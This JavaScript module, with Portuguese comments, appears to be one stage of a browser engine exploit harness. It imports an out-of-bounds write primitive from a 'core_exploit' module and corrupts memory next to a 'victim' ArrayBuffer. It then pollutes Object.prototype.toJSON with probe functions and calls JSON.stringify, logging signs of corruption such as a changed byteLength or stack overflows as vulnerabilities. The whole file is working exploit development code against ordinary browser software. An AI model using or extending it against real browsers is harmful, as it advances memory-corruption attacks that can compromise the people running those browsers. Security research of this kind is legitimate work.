// js/script3/testVictimABInstability.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG } from '../config.mjs';

// --- Variantes da toJSON para sondar victim_ab (ArrayBuffer) ---

// V1: Operações básicas em ArrayBuffer (byteLength, DataView R/W)
export function toJSON_AB_Probe_V1() {
    const FNAME_toJSON = "toJSON_AB_Probe_V1";
    let result = {
        toJSON_variant: FNAME_toJSON,
        this_type: "N/A",
        is_array_buffer_instance: false,
        byteLength_prop: "N/A",
        is_dataview_created: false,
        dv_write_val: 0xBADDBADD, // Valor que tentaremos escrever
        dv_read_val: "N/A",
        dv_rw_match: false,
        error: null
    };
    try {
        result.this_type = Object.prototype.toString.call(this);
        result.is_array_buffer_instance = this instanceof ArrayBuffer;

        if (!result.is_array_buffer_instance) {
            result.error = "this is not an ArrayBuffer instance.";
            return result;
        }

        result.byteLength_prop = this.byteLength;
        const dv = new DataView(this);
        result.is_dataview_created = true;

        if (this.byteLength >= 4) {
            dv.setUint32(0, result.dv_write_val, true);
            const readVal = dv.getUint32(0, true);
            result.dv_read_val = toHex(readVal);
            if (readVal === result.dv_write_val) {
                result.dv_rw_match = true;
            }
        } else {
            result.dv_read_val = "Buffer too small for DV R/W (size: " + this.byteLength + ")";
        }
    } catch (e) {
        result.error = `${e.name}: ${e.message}`;
    }
    return result;
}

// V2: V1 + loop for...in this (sem operações complexas dentro do loop)
export function toJSON_AB_Probe_V2() {
    const FNAME_toJSON = "toJSON_AB_Probe_V2";
    // Começa com a lógica da V1
    let result = toJSON_AB_Probe_V1(); // Chama V1 para verificações básicas
    result.toJSON_variant = FNAME_toJSON; // Sobrescreve a variante
    result.for_in_iterations = 0;
    result.for_in_error = null;

    if (result.error) { // Se V1 já teve erro, não prossegue com for...in
        return result;
    }

    try {
        for (const prop in this) {
            result.for_in_iterations++;
            if (result.for_in_iterations > 10000) { // Safety break
                logS3(`[${FNAME_toJSON}] Loop for...in V2 excedeu 10000 iterações.`, "warn", FNAME_toJSON);
                result.for_in_error = "Max iterations reached in for...in";
                break;
            }
        }
    } catch (e_for_in) {
        result.for_in_error = `${e_for_in.name}: ${e_for_in.message}`;
        if (!result.error) result.error = result.for_in_error; // Reporta o erro do for...in se não houve erro anterior
    }
    return result;
}

// V3: V2 + atribuição props_payload[prop] = String(this[prop]).substring() dentro do for...in
export function toJSON_AB_Probe_V3() {
    const FNAME_toJSON = "toJSON_AB_Probe_V3";
    // Começa com a lógica da V2 (que inclui V1 e o loop for...in básico)
    let result = toJSON_AB_Probe_V2();
    result.toJSON_variant = FNAME_toJSON; // Sobrescreve
    result.props_assigned_count = 0;
    result.assignment_error = null;
    let props_payload = {}; // O objeto que causou problemas antes

    if (result.error || result.for_in_error) { // Se V1 ou o loop for...in básico já teve erro
        return result;
    }

    try {
        // Reinicia a contagem de iterações para o loop com atribuição
        result.for_in_iterations_V3_specific = 0; // Nova contagem para este loop específico
        for (const prop in this) {
            result.for_in_iterations_V3_specific++;
            if (Object.prototype.hasOwnProperty.call(this, prop)) {
                try {
                    // Para ArrayBuffer, as propriedades enumeráveis são geralmente índices numéricos se for uma view tipada,
                    // ou métodos do protótipo. Stringify(this[prop]) em métodos pode ser complexo.
                    // Vamos focar em propriedades que não são funções.
                    if (typeof this[prop] !== 'function') {
                        props_payload[prop] = String(this[prop]).substring(0, 50);
                        result.props_assigned_count++;
                    }
                } catch (e_assign) {
                    result.assignment_error = `Error assigning prop '${prop}': ${e_assign.name} - ${e_assign.message}`;
                    logS3(`[${FNAME_toJSON}] ERRO ao processar/atribuir prop '${prop}': ${result.assignment_error}`, "warn", FNAME_toJSON);
                    // Não quebrar o loop por um erro em uma propriedade, mas registrar
                }
            }
            if (result.for_in_iterations_V3_specific > 10000) {
                logS3(`[${FNAME_toJSON}] Loop for...in V3 excedeu 10000 iterações.`, "warn", FNAME_toJSON);
                if (!result.assignment_error) result.assignment_error = "Max iterations reached in V3 for...in";
                break;
            }
        }
    } catch (e_for_in_v3) { // Erro no loop for...in da V3
        result.assignment_error = `${e_for_in_v3.name}: ${e_for_in_v3.message}`;
        if (!result.error) result.error = result.assignment_error;
    }
    // Não retornamos props_payload para evitar complexidade no log, apenas o contador
    return result;
}


export async function executeVictimABInstabilityTest(toJSONFunctionToUse, toJSONFunctionName) {
    const FNAME_TEST = `executeVictimABInstabilityTest<${toJSONFunctionName}>`;
    logS3(`--- Iniciando Sub-Teste: Sondando victim_ab com ${toJSONFunctionName} ---`, "subtest", FNAME_TEST);
    document.title = `Sondando victim_ab - ${toJSONFunctionName}`;

    const victim_ab_size_val = 64;
    const corruption_offset_in_oob_ab = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
    const value_to_write_in_oob_ab = 0xFFFFFFFF;
    const bytes_to_write_oob_val = 4;

    await triggerOOB_primitive();
    if (!oob_array_buffer_real) {
        logS3("Falha OOB Setup. Abortando sub-teste.", "error", FNAME_TEST);
        return { setupError: new Error("OOB Setup Failed") };
    }

    let victim_ab;
    try {
        victim_ab = new ArrayBuffer(victim_ab_size_val);
        logS3(`1. victim_ab (${victim_ab_size_val} bytes) criado.`, "info", FNAME_TEST);
    } catch (e_victim_alloc) {
        logS3(`ERRO ao criar victim_ab: ${e_victim_alloc.message}. Abortando.`, "error", FNAME_TEST);
        clearOOBEnvironment();
        return { setupError: e_victim_alloc };
    }

    try {
        logS3(`2. Escrevendo ${toHex(value_to_write_in_oob_ab)} em oob_array_buffer_real[${toHex(corruption_offset_in_oob_ab)}]...`, "warn", FNAME_TEST);
        oob_write_absolute(corruption_offset_in_oob_ab, value_to_write_in_oob_ab, bytes_to_write_oob_val);
        logS3(`   Escrita OOB realizada.`, "info", FNAME_TEST);
    } catch (e_write) {
        logS3(`   ERRO na escrita OOB: ${e_write.message}. Abortando.`, "error", FNAME_TEST);
        clearOOBEnvironment();
        return { setupError: e_write };
    }

    await PAUSE_S3(SHORT_PAUSE_S3);

    logS3(`3. Sondando victim_ab com ${toJSONFunctionName}...`, "test", FNAME_TEST);

    const ppKey_val = 'toJSON';
    let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
    let pollutionApplied = false;
    let result = {
        targetObjectId: "victim_ab",
        stringifyError: null,
        toJSONReturn: null,
    };

    try {
        Object.defineProperty(Object.prototype, ppKey_val, {
            value: toJSONFunctionToUse,
            writable: true, configurable: true, enumerable: false
        });
        pollutionApplied = true;

        logS3(`   Chamando JSON.stringify(victim_ab) usando ${toJSONFunctionName}...`, 'info', FNAME_TEST);
        document.title = `Stringify victim_ab - ${toJSONFunctionName}`;
        try {
            result.toJSONReturn = JSON.stringify(victim_ab);
            logS3(`     JSON.stringify(victim_ab) completou. Retorno da toJSON: ${JSON.stringify(result.toJSONReturn)}`, "info", FNAME_TEST);
            if (result.toJSONReturn && result.toJSONReturn.error) {
                 logS3(`     ERRO INTERNO na ${toJSONFunctionName}: ${result.toJSONReturn.error}`, "warn", FNAME_TEST);
                 result.stringifyError = { name: "InternalToJSONError", message: result.toJSONReturn.error };
            }
        } catch (e_str) {
            result.stringifyError = { name: e_str.name, message: e_str.message };
            logS3(`     !!!! ERRO AO STRINGIFY victim_ab !!!!: ${e_str.name} - ${e_str.message}`, "critical", FNAME_TEST);
            if (e_str.stack) logS3(`       Stack: ${e_str.stack}`, "error");
        }

    } catch (e_main_test_logic) {
        logS3(`Erro na lógica principal do teste para victim_ab: ${e_main_test_logic.message}`, "error", FNAME_TEST);
        result.stringifyError = { name: "MainTestLogicError", message: e_main_test_logic.message };
    } finally {
        if (pollutionApplied) {
            if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONDescriptor);
            else delete Object.prototype[ppKey_val];
        }
    }

    // Analisar o resultado da toJSONReturn para V1
    if (result.toJSONReturn && result.toJSONReturn.toJSON_variant === "toJSON_AB_Probe_V1") {
        if (result.toJSONReturn.error) {
            logS3(`   ${result.toJSONReturn.toJSON_variant} reportou erro interno: ${result.toJSONReturn.error}`, "error", FNAME_TEST);
        } else if (!result.toJSONReturn.is_array_buffer_instance) {
            logS3(`   ${result.toJSONReturn.toJSON_variant}: 'this' não é ArrayBuffer! Tipo: ${result.toJSONReturn.this_type}`, "critical", FNAME_TEST);
        } else if (result.toJSONReturn.byteLength_prop !== victim_ab_size_val) {
            logS3(`   ${result.toJSONReturn.toJSON_variant}: victim_ab.byteLength alterado! Esperado: ${victim_ab_size_val}, Obtido: ${result.toJSONReturn.byteLength_prop}`, "critical", FNAME_TEST);
        } else if (!result.toJSONReturn.dv_rw_match) {
            logS3(`   ${result.toJSONReturn.toJSON_variant}: Falha na R/W interna da DataView. Lido: ${result.toJSONReturn.dv_read_val} Esperado: ${toHex(result.toJSONReturn.dv_write_val)}`, "warn", FNAME_TEST);
        }
    }
    // Analisar para V2 e V3 (erros já logados se ocorrerem no stringify ou internamente)

    if (result.stringifyError && result.stringifyError.name === 'RangeError') {
        logS3(`   ---> RangeError: Maximum call stack size exceeded OCORREU com ${toJSONFunctionName} para victim_ab!`, "vuln", FNAME_TEST);
        document.title = `RangeError with ${toJSONFunctionName} on victim_ab!`;
    } else if (result.stringifyError) {
        logS3(`   Outro erro (${result.stringifyError.name}) ocorreu com ${toJSONFunctionName} para victim_ab.`, "error", FNAME_TEST);
    } else {
        logS3(`   ${toJSONFunctionName} para victim_ab completou sem erro de stringify óbvio.`, "good", FNAME_TEST);
    }

    logS3(`--- Sub-Teste com ${toJSONFunctionName} (alvo victim_ab) CONCLUÍDO ---`, "subtest", FNAME_TEST);
    clearOOBEnvironment();
    return result;
}
